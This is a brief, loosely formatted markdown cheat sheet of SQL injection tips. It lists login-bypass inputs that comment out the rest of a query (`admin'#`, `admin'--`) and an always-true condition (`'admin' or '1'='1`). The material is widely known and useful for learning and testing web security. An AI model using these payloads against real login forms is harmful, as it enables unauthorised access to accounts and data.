# SQL Injection Cheat Sheet 

This is just going to be an unorganized list of tips and tricks for SQL injection

**Adding a `#` at the end of an input can comment out anything after**
- Ex entering `admin'#` can bypass a login if it's vulnerable to SQL injection
  
**This is also true for adding `--` to the end of an input
- Ex `admin'--`


`'admin' or '1'='1`
